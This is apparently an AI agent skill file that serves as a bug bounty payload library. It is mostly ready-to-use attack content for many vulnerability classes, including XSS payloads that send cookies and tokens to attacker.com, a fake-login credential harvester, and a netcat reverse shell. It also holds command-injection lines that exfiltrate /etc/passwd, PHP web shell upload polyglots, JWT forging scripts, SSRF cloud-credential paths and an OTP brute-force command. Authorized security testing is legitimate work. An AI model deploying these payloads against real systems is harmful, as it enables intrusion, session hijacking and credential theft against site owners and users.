---
name: payload-manager
description: Central payload management system for bug bounty hunters. Organizes, categorizes, and serves payloads for every vuln class. Includes XSS, SSRF, SQLi, NoSQLi, SSTI, command injection, path traversal, IDOR, file upload, CSRF, OAuth, SAML, WebSocket, MFA bypass, protocol smuggling, and cloud-specific payloads. Use when: needing payloads for a specific vuln class, building a payload library, organizing custom payloads, or searching for bypass techniques. Chinese trigger: 负载、Payload、攻击载荷、XSS payload、SQLi payload、bypass payload
---

# Skill: Payload Manager

Organized, categorized, and searchable payload library for bug bounty hunting.

## Core Concept

```
PAYLOAD LIFECYCLE:
1. DISCOVER — Find payload needed for current test
2. CUSTOMIZE — Adapt to target context
3. DEPLOY — Send via Burp, curl, ffuf, custom script
4. ANALYZE — Review response for success/failure
5. DOCUMENT — Record what worked for report
```

---

## XSS PAYLOADS (Complete Library)

### Detection Probes

```javascript
// Basic detection (all contexts)
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)

// Quick context detection
"><script>alert(1)</script>       <!-- HTML body context -->
" onload=alert(1) x="             <!-- HTML attribute context -->
';alert(1);var x='               <!-- JavaScript string context -->
</script><script>alert(1)</script> <!-- Script context -->
```

### Cookie/Token Theft (Proof of Impact)

```javascript
// Basic exfiltration
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>

// Session token exfiltration
<script>fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))</script>
<script>fetch('https://attacker.com/steal?t='+document.querySelector('meta[name=csrf-token]').content)</script>

// Credential harvesting (fake login)
<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
  <form action="https://attacker.com/steal" method="POST">
    <input name="username" placeholder="Username" autofocus>
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
  </form>
</div>
```

### CSP Bypass Payloads

```javascript
// When unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// When script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=['alert(1)']['constructor']()}}

// Vue v-html binding
<div v-html="'<img src=x onerror=alert(1)>'"></div>

// React dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>

// JSONP callback injection
<script src="https://target.com/api/jsonp?callback=alert(1)"></script>
```

### Mutation XSS (mXSS)

```javascript
// Browser re-parsing sanitized HTML
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// MathML mXSS
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->

// SVG mXSS
<svg><style><img src=x onerror=alert(1)>
<svg><style><!DOCTYPE [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]></style></svg>
```

### Context-Specific Payloads

```javascript
// HTML body context
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// HTML attribute context (inside quotes)
" onload=alert(1) x="
' onload=alert(1) x='
" onfocus=alert(1) autofocus x="

// JavaScript context
';alert(1);var x='
";alert(1);var x="
-alert(1)-

// URL context
javascript:alert(1)
data:text/html,<script>alert(1)</script>

// CSS context
}</style><script>alert(1)</script>
expression(alert(1))
-moz-binding:url(https://attacker.com/xss.xml#xss)
```

---

## SSRF PAYLOADS (Complete Library)

### Cloud Metadata

```bash
# AWS (most common)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/network/interfaces/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure IMDS
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
Header: Metadata: true

http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
```

### Internal Service Fingerprinting

```bash
# Databases
http://localhost:6379      # Redis
http://localhost:27017     # MongoDB
http://localhost:3306      # MySQL
http://localhost:5432      # PostgreSQL

# Web services
http://localhost:8080      # Admin panel, Jenkins, Tomcat
http://localhost:8000      # Django dev server
http://localhost:3000      # Node.js dev server
http://localhost:5000      # Flask dev server

# Infrastructure
http://localhost:2375      # Docker API
http://localhost:9200      # Elasticsearch
http://localhost:5601      # Kibana
http://localhost:15672     # RabbitMQ
http://localhost:15692     # Prometheus
http://localhost:9090      # Prometheus
http://localhost:10250     # K8s Kubelet
http://localhost:10.96.0.1:443  # K8s API server
```

### SSRF IP Bypass Complete List

```bash
# Decimal IP
http://2130706433
http://3232235521
http://2852039166

# Hex IP
http://0x7f000001
http://0xc00002e0

# Octal IP
http://0177.0.0.1
http://017777700001

# Short IP
http://127.1
http://127.0.1

# IPv6 loopback
http://[::1]
http://[::ffff:127.0.0.1]
http://[::ffff:0x7f000001]

# DNS rebinding
http://spoofed.burpcollaborator.net  # Resolves to 127.0.0.1 after first check

# Redirect chain
http://allowed-domain.com/redirect?to=http://169.254.169.254/

# URL parsing tricks
http://127.0.0.1%2523@target.com
http://target.com@127.0.0.1/
http://127.0.0.1:80@target.com/
http://127.0.0.1%2f@target.com/
```

### Protocol Smuggling

```bash
# Gopher (Redis)
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aGET%0d%0a*3%0d%0a%243%0d%0akey%0d%0a

# File protocol
file:///etc/passwd
file:///proc/self/environ
file:///var/log/auth.log

# Dict protocol
dict://127.0.0.1:6379/INFO

# SFTP
sftp://attacker.com/

# LDAP
ldap://127.0.0.1:389/dc=example,dc=com
```

---

## SQL INJECTION PAYLOADS (Complete Library)

### Detection

```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL
'; SELECT SLEEP(5)--          -- MySQL
' OR SLEEP(5)--
```

### Union-Based Extraction

```sql
-- Column count discovery
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

-- Data extraction
' UNION SELECT username,NULL,NULL FROM users--
' UNION SELECT password,NULL,NULL FROM users--
' UNION SELECT username,password,email FROM users--

-- Database enumeration
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi (Boolean)

```sql
-- MySQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--

-- PostgreSQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND EXISTS(SELECT * FROM users WHERE username LIKE 'a%')--

-- MSSQL
' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a'--
' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--

-- Oracle
' AND (SELECT SUBSTR(username,1,1) FROM users WHERE ROWNUM=1)='a'--
```

### Blind SQLi (Time-Based)

```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
' AND SLEEP(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 5 ELSE 0 END)--

-- PostgreSQL
' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
' IF(SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a' WAITFOR DELAY '0:0:5'--

-- Oracle
' AND CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE ROWNUM=1)='a' THEN DBMS_LOCK.SLEEP(5) ELSE DBMS_LOCK.SLEEP(0) END--
```

### SQLi WAF Bypass

```sql
-- Comment variations
/**/SELECT/**/*/**/FROM/**/users
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
SELECT/*comment*/FROM/*comment*/users

-- Space alternatives
SELECT%0a*%0d%0aFROM%09users
SELECT+username+FROM+users

-- Case variation
SeLeCt FrOm uSeRs
sElEcT uSeRnAmE FrOm UsErS

-- Boolean encoding
1=1
1=1#
1=1--
1=1/*
```

---

## NOSQL INJECTION PAYLOADS (Complete Library)

### MongoDB Authentication Bypass

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
```

### MongoDB Data Extraction

```json
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
{"username": {"$regex": "^admi"}}
{"username": {"$regex": "^admin"}}
```

### MongoDB Blind Extraction

```json
{"username": {"$eq": "admin"}, "$where": "sleep(5000)"}
{"username": {"$eq": "admin"}, "$where": "this.password.match(/^a/) && sleep(5000)"}
{"username": {"$eq": "admin"}, "$where": "function() { return this.password.length > 5; }"}
```

### NoSQL Operator Reference

```json
// Comparison
{"$eq": "value"}
{"$ne": "value"}
{"$gt": "value"}
{"$gte": "value"}
{"$lt": "value"}
{"$lte": "value"}
{"$in": ["val1", "val2"]}
{"$nin": ["val1"]}

// Logical
{"$and": [...]}
{"$or": [...]}
{"$not": {...}}
{"$nor": [...]}

// Element
{"$exists": true}
{"$type": "string"}

// Evaluation
{"$regex": "^admin"}
{"$text": {"$search": "admin"}}
{"$where": "this.username == 'admin'"}

// Array
{"$size": 5}
{"$all": ["a", "b"]}
{"$elemMatch": {"$gt": 5}}
```

---

## COMMAND INJECTION PAYLOADS (Complete Library)

### Detection

```bash
; id
| id
`id`
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB Confirmation

```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(whoami|base64)
```

### Filter Bypass

```bash
# Space bypass
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd
;cat$(printf '\x20')/etc/passwd

# Newline bypass
;cat
/etc/passwd

# Quote bypass
;c'a't /etc/passwd
;c"a"t /etc/passwd

# Backtick bypass
;`cat /etc/passwd`

# Brace expansion
;{cat,/etc/passwd}

# Base64 encoding
;echo Y3VwIGV0Yy9wYXNzd2Q= | base64 -d | bash

# Hex encoding
;echo $(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64') | bash

# Using other binaries
;echo 'cat /etc/passwd' > /tmp/cmd.sh && bash /tmp/cmd.sh
;python3 -c 'import os; os.system("id")'
;perl -e 'system("id")'
;ruby -e 'system("id")'
;php -r 'system("id");'
;ncat -e /bin/sh attacker.com 4444

# Windows
& dir
| type C:\Windows\win.ini
& whoami
; systeminfo
| net user
& ping -n 1 attacker.com
```

---

## PATH TRAVERSAL PAYLOADS (Complete Library)

### Basic Traversal

```bash
../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%5c..%5c..%5cetc%5cpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
```

### Null Byte Truncation

```bash
/etc/passwd%00.jpg
/etc/passwd%00%00.jpg
/etc/passwd%0a
/etc/passwd%0d%0a
/etc/passwd%00.png
```

### Mixed Encoding

```bash
..%2e%2e%5c..%2e%2e%5cetc%5cpasswd
..%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252e%252e%255c..%252e%252e%255cetc%255cpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
```

### Windows-Specific

```bash
..\..\..\..\..\..\Windows\win.ini
..\..\..\..\..\..\Windows\System32\config\SAM
..\..\..\..\..\..\Windows\repair\SAM
C:\Windows\win.ini
C:/Windows/win.ini
```

---

## FILE UPLOAD PAYLOADS (Complete Library)

### Extension Bypass

```bash
# Double extension
shell.php.jpg
shell.php%00.jpg
shell.php%00.png
shell.php.\.jpg

# Case variation
shell.pHp
shell.PHP
shell.PHP5
shell.pHp7
shell.phP3

# Alternative extensions
shell.phtml
shell.phar
shell.shtml
shell.inc
shell.asp
shell.aspx
shell.jsp
shell.jspx
shell.py
shell.pl
shell.cgi
```

### Content Bypass

```bash
# GIF89a header + PHP code (polyglot)
GIF89a;
<?php system($_GET['c']); ?>

# JPEG header + PHP code
FFD8FFE0
<?php system($_GET['c']); ?>

# PDF header + JS
%PDF-1.4
<script>alert(1)</script>
```

### MIME Type Bypass

```bash
# Send PHP with image content-type
Content-Type: image/jpeg
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['c']); ?>
--boundary--

# Or use allowed extension, PHP content
Content-Type: image/png
[file content: actual PNG data + PHP at end]
```

### SVG XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>alert(document.cookie)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body onload="alert(1)">
      <iframe src="javascript:alert(1)"></iframe>
    </body>
  </foreignObject>
</svg>
```

---

## JWT ATTACK PAYLOADS

### None Algorithm

```bash
# Step 1: Decode original JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f1 | base64 -d

# Step 2: Modify header to none
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUI30

# Step 3: Set payload
echo -n '{"sub":"admin","role":"admin","exp":9999999999}' | base64 -w0

# Final token: eyJhbGciOiJub25lIiwidHlwIjoiSldUI30.PAYLOAD.
```

### RS256 to HS256 Confusion

```python
import jwt
import requests

# Step 1: Get public key from JWKS
jwks = requests.get("https://target.com/.well-known/jwks.json").json()
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks['keys'][0])

# Step 2: Forge token with HS256 using public key as secret
payload = {"sub": "admin", "role": "admin"}
forged = jwt.encode(payload, public_key, algorithm="HS256")

# Step 3: Send forged token
print(forged)
```

### Secret Brute-Force

```bash
# Wordlist
secret
password
key
jwt
token
default
changeme
123456
admin
letmein
skillissue
supersecret
mykey
target_name

# Hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --force

# John
john --format=HMAC-SHA256 jwt.txt --wordlist=wordlist.txt
```

### kid Injection

```json
// Path traversal
{"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}

// SQL injection
{"alg": "HS256", "typ": "JWT", "kid": "0' UNION SELECT 'attacker_secret'--"}

// Command injection (if kid used in exec)
{"alg": "HS256", "typ": "JWT", "kid": "key; curl attacker.com/$(cat /etc/passwd | base64)"}
```

---

## CSRF PAYLOADS

### Basic Form CSRF

```html
<form action="https://target.com/api/email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="password" value="newpassword123">
</form>
<script>document.forms[0].submit()</script>
```

### JSON CSRF

```html
<form action="https://target.com/api/settings" method="POST">
  <input name='{"settings":{"admin":true,"role":"admin"}}' value=''>
</form>
<script>document.forms[0].submit()</script>
```

### AJAX CSRF

```html
<script>
fetch("https://target.com/api/email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

### CSRF via Image

```html
<img src="https://target.com/api/transfer?to=attacker&amount=10000">
```

---

## OAUTH PAYLOADS

### Open Redirect in OAuth

```bash
# Redirect to attacker
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://attacker.com/callback

# Redirect via target's own redirect
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://target.com/redirect?to=https://attacker.com

# Wildcard redirect
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://*.target.com
```

### State Parameter Bypass

```bash
# Remove state
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y

# Static state
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y&state=123456
```

### PKCE Bypass

```bash
# No code_challenge
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y

# Plain challenge (not S256)
code_challenge=plaintext_challenge
code_challenge_method=plain
```

---

## SAML PAYLOADS

### XML Signature Wrapping

```xml
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Comment Injection

```xml
<NameID>admin<!---->@company.com</NameID>
<!-- Parser sees: admin@company.com -->
<!-- Validator sees: user@company.com (before comment) -->
```

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass

```json
{"action": "subscribe", "channel": "user_VICTIM_ID"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### XSS via WebSocket

```json
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}
{"message": "<script>alert(1)</script>"}
{"message": "<svg onload=alert(1)>"}
```

### SSRF via WebSocket

```json
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
{"action": "fetch", "url": "http://localhost:6379/INFO"}
```

---

## MFA/2FA PAYLOADS

### OTP Brute Force

```bash
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5
```

### Response Manipulation

```json
// Change success flag
{"success": false} → {"success": true}

// Change redirect
{"redirect": "/mfa-failed"} → {"redirect": "/dashboard"}

// Change user ID
{"userId": null} → {"userId": 1}
```

---

## PAYLOAD ORGANIZATION SYSTEM

### Directory Structure

```
payloads/
├── xss/
│   ├── basic.txt
│   ├── cookie-theft.txt
│   ├── csp-bypass.txt
│   ├── mxss.txt
│   └── context-specific.txt
├── ssrf/
│   ├── cloud-meta.txt
│   ├── internal-services.txt
│   ├── ip-bypass.txt
│   └── protocol-smuggling.txt
├── sqli/
│   ├── detection.txt
│   ├── union-based.txt
│   ├── blind-boolean.txt
│   ├── blind-time.txt
│   └── waf-bypass.txt
├── nosqli/
│   ├── auth-bypass.txt
│   ├── operators.txt
│   └── extraction.txt
├── cmdi/
│   ├── basic.txt
│   ├── blind.txt
│   └── filter-bypass.txt
├── ssti/
│   ├── detection.txt
│   ├── jinja2.txt
│   ├── twig.txt
│   ├── freemarker.txt
│   └── erb.txt
├── traversal/
│   ├── basic.txt
│   ├── encoding.txt
│   └── null-byte.txt
├── upload/
│   ├── extensions.txt
│   ├── content-bypass.txt
│   └── svg-xss.txt
├── csrf/
│   ├── basic.txt
│   ├── json-csrf.txt
│   └── bypasses.txt
├── oauth/
│   ├── redirect.txt
│   ├── state-bypass.txt
│   └── pkce-bypass.txt
├── saml/
│   ├── xsw.txt
│   └── signature-bypass.txt
├── websocket/
│   ├── idor.txt
│   ├── xss.txt
│   └── ssrf.txt
├── mfa/
│   ├── otp-brute.txt
│   └── bypass.txt
└── cloud/
    ├── aws.txt
    ├── gcp.txt
    └── azure.txt
```

### Using the Payload Library

```bash
# Search for payloads
grep -r "169.254.169.254" payloads/
grep -r "alert(1)" payloads/xss/

# Use with ffuf
ffuf -u "https://target.com/endpoint?param=FUZZ" \
  -w payloads/xss/basic.txt \
  -ac

# Use with curl in loop
while read payload; do
    curl -s "https://target.com/search?q=$payload" | grep -i "alert"
done < payloads/xss/basic.txt
```

---

## PAYLOAD BEST PRACTICES

1. **Test basic payloads first** — before complex bypasses
2. **Document what worked** — build your own payload library
3. **Customize for context** — adapt payloads to the specific application
4. **Use encoding** — URL, HTML, Unicode encoding as needed
5. **Combine techniques** — chain bypasses when single technique fails
6. **Verify before reporting** — ensure payload actually works
7. **Clean up** — remove test accounts, uploaded files after testing
8. **Rate limit** — don't trigger WAF/IDS with rapid payloads
9. **Save evidence** — screenshots, requests, responses for reports
10. **Learn from failures** — analyze why payloads didn't work

---

## PAYLOAD EVOLUTION

### How Payloads Become Obsolete

```
1. WAF/IDS updates → old payloads blocked
2. Browser patches → XSS vectors fixed
3. Framework updates → default protections added
4. Language updates → functions deprecated/secured

How to stay current:
1. Follow security researchers on Twitter
2. Read new disclosed reports
3. Update payloads from repos regularly
4. Test old payloads against new targets
5. Join bug bounty Discord/Telegram communities
```

---

## FINAL PAYLOAD RULES

1. **Understand before using** — know what each payload does
2. **Test in Burp first** — don't blast payloads at production
3. **Start simple, escalate complexity** — basic → encoding → bypass
4. **Document successful payloads** — build your personal library
5. **Share responsibly** — contribute back to the community
6. **Never use for illegal purposes** — authorized testing only
7. **Respect scope** — only test in-scope assets
8. **Stay ethical** — responsible disclosure only